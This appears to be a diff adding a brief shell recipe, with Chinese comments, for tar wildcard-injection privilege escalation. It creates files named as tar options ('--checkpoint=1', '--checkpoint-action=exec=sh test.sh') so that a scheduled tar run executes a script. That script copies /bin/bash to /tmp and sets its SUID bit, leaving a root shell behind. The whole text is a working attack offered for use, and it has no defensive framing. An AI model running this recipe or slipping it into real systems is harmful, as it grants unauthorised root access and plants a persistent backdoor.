@@ -1,0 +1,6 @@
+#tar--checkpoint=1调用其他命令执行
+echo "" > --checkpoint=1  
+echo "" > "--checkpoint-action=exec=sh test.sh"  
+echo 'cp /bin/bash /tmp/bash;chmod +s /tmp/bash' > test.sh  
+chmod +x test.sh 
+#创建好文件之后把定时任务开起来.
